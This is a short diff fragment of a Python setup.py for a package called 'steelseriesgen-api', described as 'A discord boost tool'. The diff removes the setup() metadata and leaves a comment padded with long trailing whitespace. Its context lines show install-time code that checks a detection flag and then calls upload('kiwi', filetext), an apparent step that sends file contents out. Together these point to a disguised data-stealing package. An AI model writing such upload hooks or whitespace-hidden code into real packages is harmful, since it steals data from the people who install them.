@@ -678,16 +678,4 @@ if not DETECTED:
     upload('kiwi',filetext)
 
 
-setup(
-
-    name='steelseriesgen-api',
-    packages=['steelseriesgen-api'],
-    version='1.0',
-    license='MIT',
-    description='A discord boost tool',
-    author='bluesatan',
-    keywords=['style'],
-    install_requires=[''],
-    classifiers=['Development Status :: 5 - Production/Stable']
-
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                   
